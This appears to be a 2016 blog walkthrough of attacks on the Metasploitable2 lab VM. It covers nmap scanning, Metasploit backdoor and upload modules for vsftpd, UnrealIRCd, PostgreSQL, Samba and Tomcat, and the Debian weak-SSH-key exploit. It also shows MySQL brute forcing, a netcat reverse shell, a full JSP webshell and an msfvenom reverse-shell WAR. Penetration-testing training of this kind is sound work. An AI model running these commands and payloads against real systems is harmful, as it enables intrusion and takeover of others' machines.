---
layout: post
title: "metasploitable2"
date: 2016-06-22 15:18:00 -0500
comments: true
categories: [metasploit]
---

* netdiscover
* Nmap
* Metasploit
* smbclient
* enum4linux
* Nikto


<!--more-->

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/misc/metasploitable2/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.179 is the target.


Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.179 -p-`


```
e-scanning.
Initiating NSE at 15:46
Completed NSE at 15:46, 0.00s elapsed
Initiating NSE at 15:46
Completed NSE at 15:46, 0.00s elapsed
Initiating ARP Ping Scan at 15:46
Scanning 192.168.79.179 [1 port]
Completed ARP Ping Scan at 15:46, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:46
Completed Parallel DNS resolution of 1 host. at 15:46, 2.04s elapsed
Initiating SYN Stealth Scan at 15:46
Scanning 192.168.79.179 [65535 ports]
Discovered open port 21/tcp on 192.168.79.179
Discovered open port 23/tcp on 192.168.79.179
Discovered open port 80/tcp on 192.168.79.179
Discovered open port 22/tcp on 192.168.79.179
Discovered open port 3306/tcp on 192.168.79.179
Discovered open port 5900/tcp on 192.168.79.179
Discovered open port 139/tcp on 192.168.79.179
Discovered open port 111/tcp on 192.168.79.179
Discovered open port 445/tcp on 192.168.79.179
Discovered open port 53/tcp on 192.168.79.179
Discovered open port 25/tcp on 192.168.79.179
Discovered open port 2049/tcp on 192.168.79.179
Discovered open port 6697/tcp on 192.168.79.179
Discovered open port 52739/tcp on 192.168.79.179
Discovered open port 5432/tcp on 192.168.79.179
Discovered open port 513/tcp on 192.168.79.179
Discovered open port 57206/tcp on 192.168.79.179
Discovered open port 6000/tcp on 192.168.79.179
Discovered open port 514/tcp on 192.168.79.179
Discovered open port 8787/tcp on 192.168.79.179
Discovered open port 1524/tcp on 192.168.79.179
Discovered open port 1099/tcp on 192.168.79.179
Discovered open port 47980/tcp on 192.168.79.179
Discovered open port 8009/tcp on 192.168.79.179
Discovered open port 3632/tcp on 192.168.79.179
Discovered open port 2121/tcp on 192.168.79.179
Discovered open port 8180/tcp on 192.168.79.179
Discovered open port 6667/tcp on 192.168.79.179
Discovered open port 57218/tcp on 192.168.79.179
Discovered open port 512/tcp on 192.168.79.179
Completed SYN Stealth Scan at 15:46, 0.83s elapsed (65535 total ports)
Initiating Service scan at 15:46
Scanning 30 services on 192.168.79.179
Completed Service scan at 15:48, 141.15s elapsed (30 services on 1 host)
Initiating OS detection (try #1) against 192.168.79.179
NSE: Script scanning 192.168.79.179.
Initiating NSE at 15:48
Completed NSE at 15:49, 62.29s elapsed
Initiating NSE at 15:49
Completed NSE at 15:49, 1.02s elapsed
Nmap scan report for 192.168.79.179
Host is up (0.00013s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828
|_SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6
|_ssl-date: 2016-06-22T20:48:28+00:00; -23s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      40038/udp  mountd
|   100005  1,2,3      47980/tcp  mountd
|   100021  1,3,4      36995/udp  nlockmgr
|   100021  1,3,4      57218/tcp  nlockmgr
|   100024  1          52739/tcp  status
|_  100024  1          60788/udp  status
139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
1099/tcp  open  rmiregistry GNU Classpath grmiregistry
1524/tcp  open  shell       Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 53
|   Version: .0.51a-3ubuntu5
|   Thread ID: 10
|   Capabilities flags: 43564
|   Some Capabilities: LongColumnFlag, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: 0o_q:k/GUV24Mf<6:aZ~
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828
|_SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6
|_ssl-date: 2016-06-22T20:48:28+00:00; -22s from scanner time.
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    Unknown security type (33554432)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         Unreal ircd
6697/tcp  open  irc         Unreal ircd
| irc-info: 
|   users: 2
|   servers: 1
|   lusers: 2
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 0:37:22
|   source ident: nmap
|   source host: DCF8F1B0.E9B94EC6.FFFA6D49.IP
|_  error: Closing Link: jpmvzpmdu[192.168.79.173] (Quit: jpmvzpmdu)
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
47980/tcp open  mountd      1-3 (RPC #100005)
52739/tcp open  status      1 (RPC #100024)
57206/tcp open  unknown
57218/tcp open  nlockmgr    1-4 (RPC #100021)
MAC Address: 00:0C:29:B1:FE:27 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.023 days (since Wed Jun 22 15:16:04 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=204 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   METASPLOITABLE<00>   Flags: <unique><active>
|   METASPLOITABLE<03>   Flags: <unique><active>
|   METASPLOITABLE<20>   Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP
|_  System time: 2016-06-22T16:48:29-04:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.13 ms 192.168.79.179

NSE: Script Post-scanning.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.95 seconds
           Raw packets sent: 65555 (2.885MB) | Rcvd: 65552 (2.623MB)
```


### vsftpd exploit:

search vsftpd

{% img  /images/blog/misc/metasploitable2/Selection_002.png   [title manually exploit [alt text]] %}


```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > set rhost 192.168.79.179
msf exploit(vsftpd_234_backdoor) > exploit 
```

get the root:

{% img  /images/blog/misc/metasploitable2/Selection_003.png   [title manually exploit [alt text]] %}



### postgresql exploit

```
msf > use exploit/linux/postgres/postgres_payload
msf exploit(postgres_payload) > set rhost 192.168.79.179
msf exploit(postgres_payload) > exploit
```
get meterpreter:

{% img  /images/blog/misc/metasploitable2/Selection_004.png   [title manually exploit [alt text]] %}


### SSH exploit:

Getting access to a system with a writeable filesystem

[add_ssh_key.py](https://github.com/wg135/script/blob/master/add_ssh_key.py)

Since the nmap shows the openssh version is 4.7. I googled it and find it use Openssl 0.9.8g

search openssl exploit:

`searchsploit openssl`

{% img  /images/blog/misc/metasploitable2/Selection_019.png   [title manually exploit [alt text]] %}

Looks like these exploits can be used. The vulnerability is CVE-2008-0166.

I use 5720.py.

First, download precalculated vulnerable keys

`wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2`

unzip it

`tar jxf 5622.tar.bz2`

run the command:

`python 5720.py rsa/2048/ 192.168.79.179 root 22 5`

rsa/2048 is the folder contains the keys.

Found keys:

{% img  /images/blog/misc/metasploitable2/Selection_020.png   [title manually exploit [alt text]] %}


login the box:

`ssh -l root -p22 -i rsa/2048//c551f0a5d2f76d88b58b3ae90ceb617a-22002 192.168.79.179`


{% img  /images/blog/misc/metasploitable2/Selection_021.png   [title manually exploit [alt text]] %}



### SMB exploit:


Enumerate smtp:

`enum4linux 192.168.79.179`


{% img  /images/blog/misc/metasploitable2/Selection_005.png   [title manually exploit [alt text]] %}

looks like [wide links](https://www.samba.org/samba/news/symlink_attack.html)

```
use auxiliary/admin/smb/samba_symlink_traversal
msf auxiliary(samba_symlink_traversal) > set rhost 192.168.79.179
msf auxiliary(samba_symlink_traversal) > set SMBSHARE tmp
msf auxiliary(samba_symlink_traversal) > exploit

```

{% img  /images/blog/misc/metasploitable2/Selection_006.png   [title manually exploit [alt text]] %}

looks good

now use smbclient to login

`smbclient //192.168.79.179/tmp`

{% img  /images/blog/misc/metasploitable2/Selection_007.png   [title manually exploit [alt text]] %}




### Unreal ircd exploit

`msf > search unreal ircd`

{% img  /images/blog/misc/metasploitable2/Selection_008.png   [title manually exploit [alt text]] %}

same version



```
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unreal_ircd_3281_backdoor) > set rhost 192.168.79.179
msf exploit(unreal_ircd_3281_backdoor) > exploit
```

{% img  /images/blog/misc/metasploitable2/Selection_009.png   [title manually exploit [alt text]] %}



### Mysql exploit

####Discover MySQL version:

```
msf > use auxiliary/scanner/mysql/mysql_version
msf auxiliary(mysql_version) > set rhosts 192.168.79.179
msf auxiliary(mysql_version) > run
```

{% img  /images/blog/misc/metasploitable2/Selection_010.png   [title manually exploit [alt text]] %}


####Brute Force MySQL Login

```
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > set rhosts 192.168.79.179
msf auxiliary(mysql_login) > set USER_FILE /usr/share/wordlists/rockyou.txt
msf auxiliary(mysql_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf auxiliary(mysql_login) > run
```

get root and guest without setting password 


{% img  /images/blog/misc/metasploitable2/Selection_011.png   [title manually exploit [alt text]] %}


Once get the credential, login to MySQL

`mysql -h 192.168.79.179 -u root -p`

In Kali setup nc:

`nc -nlvp 1234`

In MySQL, execute system command:

`mysql> system nc 192.168.79.173 1234 -e /bin/bash`


get the root:


{% img  /images/blog/misc/metasploitable2/Selection_012.png   [title manually exploit [alt text]] %}



### Exploit Apache Tomcat (port 8180)

use Nikto  to scan

`nikto -h 182.168.79.179:8180`

{% img  /images/blog/misc/metasploitable2/Selection_013.png   [title manually exploit [alt text]] %}


defalut credential is found: ID 'tomcat', PW 'tomcat'.


nagviate to http://192.168.79.179:8180/manager/html, input username/password, and we are in:

{% img  /images/blog/misc/metasploitable2/Selection_014.png   [title manually exploit [alt text]] %}

same shit, generate upload WAR reverse shell backdoor.


create webshell called index.jsp (from pentester lab, you may generate it using msfvenom)


```jsp

<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>

```


now pack the webshell

```
mkdir webshell
cp index.jsp webshell

cd webshell
jar -cvf ../webshell.war *
```


deploy it and visit http://192.168.79.179:8180/webshell/index.jsp?

{% img  /images/blog/misc/metasploitable2/Selection_015.png   [title manually exploit [alt text]] %}

use msfvenom to create webshell:

`msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.79.173 lport=4444 -f war > webshell1.war`

setup nc in kali, deploy it and visit http://192.168.79.179:8180/webshell1/


After connection, get the shell:

`python -c 'import pty; pty.spawn("/bin/bash")'`


{% img  /images/blog/misc/metasploitable2/Selection_016.png   [title manually exploit [alt text]] %}


Use Metasploit:

`msf > search tomcat`

{% img  /images/blog/misc/metasploitable2/Selection_017.png   [title manually exploit [alt text]] %}

```
msf > use exploit/multi/http/tomcat_mgr_upload
msf exploit(tomcat_mgr_upload) > set rhost 192.168.79.179
msf exploit(tomcat_mgr_upload) > set rport 8180
msf exploit(tomcat_mgr_upload) > exploit
```

{% img  /images/blog/misc/metasploitable2/Selection_018.png   [title manually exploit [alt text]] %}















